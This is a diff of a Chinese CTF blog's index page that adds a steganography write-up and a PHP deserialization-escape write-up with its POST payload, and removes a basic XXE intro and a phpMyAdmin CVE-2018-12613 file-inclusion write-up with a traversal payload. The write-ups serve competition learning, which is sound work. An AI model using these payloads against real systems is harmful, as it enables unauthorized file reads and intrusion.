@@ -71,6 +71,159 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-74" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/14/page-74/" class="article-date">
+  <time class="dt-published" datetime="2021-07-14T02:31:38.000Z" itemprop="datePublished">2021-07-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/14/page-74/">强网杯2021 threebody</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a这关啊很神奇啊</p>
+<p>stegsolve 打开转一转看到这么一张图看了半天 哎我是废物(；′⌒`)</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/33.PNG?raw=true" alt="33.PNG"></p>
+<p>图片放大后发现像素点排列很有规律 010看像素值</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/34.PNG?raw=true" alt="34.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/35.PNG?raw=true" alt="35.PNG"></p>
+<p>按理说<strong>正常图像像素点之间差值都不会很大</strong></p>
+<p> 但是这边<strong>以三为周期之间差值很大但是四为周期就很小</strong><br>试一下给这个图升维处理<br><strong>bmp图片有个叫bibitcount</strong> 就是每个像素所占的字节数<br>现在**是24 即3个字节 将其改为32 **</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/36.PNG?raw=true" alt="36.PNG"></p>
+<p>就变成新的图片了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/37.PNG?raw=true" alt="37.PNG"></p>
+<p>然后老样子stegsolve  发现一老头</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/38.PNG?raw=true" alt="38.PNG"></p>
+<p>右上角有一串白点代表藏着信息<br>dataextra 查看其中信息 alpha red green bule 的0 一个个试下来</p>
+<p>blue这边发现了东西  先行后列查看 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/39.PNG?raw=true" alt="39.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/40.PNG?raw=true" alt="40.PNG"></p>
+<p>这老头叫david  著名数学家 大卫希尔伯特<br>010那边多出来一个通道 而且值和blue的很接近</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/41.PNG?raw=true" alt="41.PNG"></p>
+<p>尝试将reversed通道的值复制给blue<br>跑脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody.bmp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.read()</span><br><span class="line"></span><br><span class="line">w = <span class="number">580</span></span><br><span class="line">h = <span class="number">435</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line">l = <span class="built_in">bytearray</span>(d)</span><br><span class="line">off = l[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        l[off+j*b+i*b*w] = l[off+j*b+i*b*w+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody_new.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(l)</span><br></pre></td></tr></table></figure>
+
+<p>生成新的图片然后再次分析有找到一张不一样的图片</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/42.PNG?raw=true" alt="42.PNG"></p>
+<p>考虑这张图是二维的 图片按照01序列来保存但没有什么结果，并且如果是逐行保存的话不应该出现左上角的区域与其他区域密度明显不同的情况。<br>前面的三体和大卫联合搜索一下会发现一个网址</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg">https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg</a><br><strong>希尔伯特曲线</strong><br><strong>这是一种将高维进行降维处理的一种方法，所以在这里可以将二维的二进制数组转成一维的二进制流。</strong><br>这边得到的是128<em>128的矩阵128=2</em>7应该使用7维的希尔伯特矩阵<br>用脚本把二维的01矩阵降维成一维的二进制流就能得到隐藏文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(<span class="string">&#x27;threebody_new.bmp&#x27;</span>) <span class="keyword">as</span> img:</span><br><span class="line">    arr = np.asarray(img)</span><br><span class="line">arr = np.vectorize(<span class="keyword">lambda</span> x: x&amp;<span class="number">1</span>)(arr[:,:,<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">0</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">0</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">1</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">1</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">arr = arr[x1:x2+<span class="number">1</span>, y1:y2+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">7</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x,y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += <span class="built_in">str</span>(arr[<span class="number">127</span>-y][x])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">int</span>(s,<span class="number">2</span>).to_bytes(<span class="number">2048</span>, <span class="string">&#x27;big&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>生成一个output的文件是c语言代码</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/43.PNG?raw=true" alt="43.PNG"></p>
+<p>另存为.c 打开发现源码这边11行的位置后面全是空格和tab</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/44.PNG?raw=true" alt="44.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/45.PNG?raw=true" alt="45.PNG"></p>
+<p><strong>把0当作空格 1当作tab转换成二进制流</strong><br>01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101<br>对这一串出来对了大半天<br>flag{D1mEn5i0nAl_Pr061em}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/14/page-74/" data-id="cksyl7wjy001sw4w79qtl4ria" data-title="强网杯2021 threebody" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-73" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-73/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T09:17:01.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/13/page-73/">安洵杯 2019easy_serialize_php</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>开头即可拿到源码</strong><br><strong>然后提示phpinfo  phpinfo</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/11.PNG?raw=true" alt="11.PNG"></p>
+<p>将其base64<br>代码<strong>最后一行有一个file_get_contents是能够读取文件的函数</strong>，他这里读取的是base64解密的’img’,往前找这个’img’<br>一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的’php’,’flag’,’php5’,’php4’,’fl1g’都会被空格替代，而这层过滤函数会干扰序列化后的数据。</p>
+<p>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，<br><strong>特点一</strong><br>例如：</p>
+<?php
+$str='a:2:{i:0;s:6:"aaaaaa";i:1;s:3:"aaa";}';
+var_dump(unserialize($str));
+输出结果：array(2) { [0]=> string(6) "aaaaaa" [1]=> string(3) "aaa" }
+序列化如果增加或删除str的任何一个字符会导致序列化失败，但是如果在str末尾大括号外加上东西就还是可以序列出来
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:6:&quot;aaaaaa&quot;;i:1;s:3:&quot;aaa&quot;;&#125;aaa&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:6:&quot;aaaaaa&quot;;i:1;s:3:&quot;aaa&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>)); </span><br></pre></td></tr></table></figure>
+
+反序列化识别有一定范围，范围外都会忽略但是不影响反序列化结果
+
+**特点二：**
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflag&#x27;</span>；</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:1:&quot;s&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>]=<span class="string">&#x27;asdasdasd&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>
+
+输出：
+a:3:{s:4:"user";s:16:"flagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"s";}";s:3:"img";s:9:"asdasdasd";}
+**这题存在过滤机制将flag过滤成空格**
+a:3:{s:4:"user";s:16:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"s";}";s:3:"img";s:9:"asdasdasd";}
+替换为空之后会向后再读取16个将其当作s:16:" " 的内容;s:8:"function";  但是这样无法读取到img的内容 
+这边这个十六就得改成24 ;s:8:"function";s:59:"a" 恰好到分号的位置 
+序列改成：a:3{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"s";}";s:3:"img";s:9:"asdasdasd";}
+而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则，所以序列化结果为：
+
+$_SESSION["user"]='";s:8:"function";s:59:"a";
+$_SESSION["img"]="ZDBnM19mMWFnLnBocA=="
+$_SESSION["aa"]="s"
+这样seeeion数组的键值img对应的值发生改变
+那么可以控制原来的session数组的function的值但无法控制，但这个方法就可以旁敲侧击的控制img的值，用ZDBnM19mMWFnLnBocA==代替了真正的base64编码，读取了d0g3_f1ag.php的内容。而识别完成后最后面的";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}被忽略掉了，不影响正常的反序列化过程。
+
+get：f=show_image
+post: _SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+然后大概就知道flag在哪了_
+
+base64一下 然后替换掉ZD
+
+![10.PNG](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/10.PNG?raw=true)
+POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+
+![12.PNG](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/12.PNG?raw=true)
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-73/" data-id="cksyl7wjx001rw4w77f9y4g9y" data-title="安洵杯 2019easy_serialize_php" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-72" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/13/page-72/" class="article-date">
@@ -540,101 +693,6 @@ def checkSign(self):
 
 
   
-    <article id="post-page-63" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-63/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:52:05.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-63/">NCTF2019fakeXMLcookbook</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>看到题目名字XML，XXE漏洞<br>XML<br>什么是 XML？<br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。<br>XML基本格式与基本语法<br>基本格式：</p>
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
-<p><bookstore>                                                 <!--根元素--><br><book category="COOKING">        <!--bookstore的子元素，category为属性--></p>
-<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
-<author>Giada De Laurentiis</author>                  <!--book的子元素-->
-<year>2005</year>                                     <!--book的子元素-->
-<price>30.00</price>                                  <!--book的子元素-->
-</book>                                                 <!--book的结束-->
-</bookstore>                                       <!--bookstore的结束-->
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。   
-基本语法：
-
-<p>所有 XML 元素都须有关闭标签。<br>XML 标签对大小写敏感。<br>XML 必须正确地嵌套。<br>XML 文档必须有根元素。<br>XML 的属性值须加引号。<br>若多个字符都需要转义，则可以将这些内容存放到CDATA里面</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/5.PNG?raw=true" alt="5.PNG"></p>
-<p>XML的设计宗旨是<strong>传输数据</strong>，而非显示数据。<br>XML注入前提条件<br>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/6.PNG?raw=true" alt="6.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-63/" data-id="cksyl7wjs001iw4w7ar2ycrzo" data-title="NCTF2019fakeXMLcookbook" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-62" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-62/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:52:03.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-62/">GWCTF 2019我有一个数据库  1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>还挺大胆直接告诉人你有一个<strong>数据库 url后/phpmyadmin 跳到php后台了</strong><br>然后看这版本4.8.1 <strong>有个漏洞叫（CVE-2018-12613）</strong> 可以远程文件包含漏洞<br>$target_blacklist = array (<br>    ‘import.php’, ‘export.php’<br>);</p>
-<p>// If we have a valid target, let’s load that script instead<br>if (! empty($_REQUEST[‘target’])<br>    &amp;&amp; is_string($_REQUEST[‘target’])<br>    &amp;&amp; ! preg_match(‘/^index/‘, $_REQUEST[‘target’])<br>    &amp;&amp; ! in_array($_REQUEST[‘target’], $target_blacklist)<br>    &amp;&amp; Core::checkPageValidity($_REQUEST[‘target’])<br>) {<br>    include $_REQUEST[‘target’];<br>    exit;<br>}<br>满足5个条件后就会include$_REQUEST[‘target’]的内容</p>
-<p>$_REQUEST[‘target’]不为空<br>$_REQUEST[‘target’]是字符串<br>$_REQUEST[‘target’]不以index开头<br>$_REQUEST[‘target’]不在$target_blacklist中 ‘import.php’, ‘export.php’<br>然后接下去的原理就看不懂了<br>任意文件包含<br>通过目录穿越包含任意文件 ?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini   这波这个payload就可以直接用了<br>?target=db_datadict.php%253f/../../../../../../../../../flag   /../ 这个慢慢加加到出现flag即可</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-62/" data-id="cksyl7wjr001hw4w73el79u3h" data-title="GWCTF 2019我有一个数据库  1" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -671,6 +729,14 @@ def checkSign(self):
       <ul>
         
           <li>
+            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-117/">第五空间misc</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
           </li>
         
@@ -680,14 +746,6 @@ def checkSign(self):
         
           <li>
             <a href="/2021/09/09/page-114/">page</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
           </li>
         
       </ul>
